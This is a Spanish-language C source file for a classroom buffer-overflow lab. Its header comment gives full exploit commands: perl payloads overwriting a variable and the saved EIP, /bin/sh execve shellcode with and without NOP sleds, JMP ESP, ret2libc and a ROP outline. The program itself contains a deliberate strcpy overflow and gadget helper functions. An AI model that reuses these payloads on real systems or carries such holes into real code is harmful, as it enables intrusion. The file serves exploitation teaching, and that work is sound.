/* 
Autor: Gabriel Maciá

***** Preparación para la ejecución: 
 Deshabilitar ASLR: 
	sudo su
	echo 0 > /proc/sys/kernel/randomize_va_space

***** EJERCICIOS: 

1) Ejecutar la función éxito: 
	Cambiar el valor de la variable "valor" a 3: 
		./vuln `perl -e 'print "A"x500 . "\x03"'`

2) Ejecutar la función exito2
	- Localizar el valor del puntero a la funcion exito2: 
			(gdb) print exito2
			$1 = {int ()} 0x8049325 <exito2>0x8049325
			
	- Localizar la posición del Saved EIP con gdb --> offset de 516 bytes
	- Hacer overflow del Saved EIP.
	
		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x25\x93\x04\x08"'`

3) Ejecutar una shellcode que arranque /bin/sh:

	Shellcode (25 bytes):
		execve ("/bin/sh", ["/bin/sh"], 0)
		"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
		
	Sin NOP Sled
		./vuln `perl -e 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x475 . "\x03" . "B"x15 . "\xc8\xcf\xff\xff" '`  

	Con NOP Sled
		./vuln `perl -e 'print "\x90"x70 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x405 . "\x03" . "B"x15 . "\xc8\xcf\xff\xff" '`

5) Técnica JMP ESP:  www.exploit-db.com/papers/13232
	Evita tener que conocer la posición exacta del buffer. Es similar a la anterior, pero en este caso escribirmos el payload después del savedEIP y en el savedEIP llamamos a una instrucción JMP $ESP.
		
		root@kali:~/# sudo apt install framework2
		root@kali:~/# /usr/share/framework2/msfelfscan -f ./vuln -j esp
		0x08049461   jmp esp
		 
	A veces no se encuentra esta instruccion, pero se puede encontrar entrelazada en otras instrucciones, dado que jmp $esp es \xff\xe4
	
	La explotación se consigue entonces asi: 
	
		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x61\x94\x04\x08" . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`

6) Técnica ret2libc. 

	Compilar con NX y probamos los exploits anteriores y vemos que no se ejecutan. 
		# ./compile vuln_stack.c nx 
		# mv vuln_stack vuln_stack_nx
		# rm vuln
		# ln -s vuln_stack_nx vuln
	
	Utilizamos entonces la técnica ret2libc (explicación en clase)
	
		(gdb) p system  (nota: hacer antes break main y run para que se cargue la libc)
		$1 = {<text variable, no debug info>} 0xf7e0ab30 <system>
		(gdb) find &system,+9999999,"/bin/sh"
		0xf7f4aaaa
		warning: Unable to access 16000 bytes of target memory at 0xf7faa6b2, halting search.
		1 pattern found.

	Con PEDA se puede hacer: 
		gdb-peda$ searchmem "/bin/sh" 
		Searching for '/bin/sh' in: None ranges
		Found 1 results, display max 1 items:
		libc : 0xf7f52f68 ("/bin/sh")

	
	Resultados obtenidos: 
		system:  0xf7e0ab30
		/bin/sh: 0xf7f4aaaa  
	
	Payload a ejecutar: 
		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x30\xab\xe0\xf7" . "AAAA" . "\xaa\xaa\xf4\xf7"'`

	Ahora ponemos también la función exit en el regreso para evitar el segmentation fault:
		exit: 0xf7dfdb30

		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x30\xab\xe0\xf7" . "\x30\xdb\xdf\xf7" . "\xaa\xaa\xf4\xf7"'`

5) Técnica ROP: 
	Con esta técnica se va a ejecutar /bin/bash utilizando las funciones que aparecen en el ejecutable y que no se utilizan. Se ejecutarán de forma encadenada. Ver script rop.py para encontrar la solución. 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void callit (char *nombre);
int exito();
int exito2();

int main (int argc, char **argv) {


	if (argc < 2) {
		printf ("Usage: %s <nombre>\n\n", argv[0]);
		exit(0);
	}

	callit(argv[1]);
}

void callit (char *nombre) {
	int valor;
	char buffer[500];
	
	valor = 0;	
	strcpy (buffer, nombre);
	printf ("-------------------\n");
	printf ("Valor : \t%p [%d]\n", &valor, valor);	
	printf ("Buffer en: \t%p\n", buffer);
	printf ("Dirección de la funcion exito2: %p\n", exito2); 	
	printf ("-------------------\n");
	if (valor==3) {
		 exito();
	}
	else {
		printf ("[!] Sin exito\n"); 
	}
	valor = 0; 
}

int exito () {

	printf ("\n--------------------------------------\n");
	printf ("[+] CONSEGUIDO!!!\n");
	printf ("\n--------------------------------------\n");
	
}

int exito2 () {

	printf ("\n--------------------------------------\n");
	printf ("[+] WOOOOO!!!");
	printf ("\n--------------------------------------\n");
	
}

// Funciones para ROPEAR!!

char string[100];

void exec_string() {
  system("printf \"[+] ERES UN MEGACRACK\n[+] Arrancando un bash para ti...\""); 
  system(string);
}

void add_bin(int magic) {
  if (magic == 0xdeadbeef) {
    strcat(string, "/bin");
  }
}

void add_bash(int magic1, int magic2) {
  if (magic1 == 0xcafebabe && magic2 == 0x0badf00d) {
    strcat(string, "/bash");
  }
}

// Funcion para que el codigo contenga un salto a ESP (técnica JMP ESP)
void jmpesp() {
	__asm__("jmp *%esp");
}

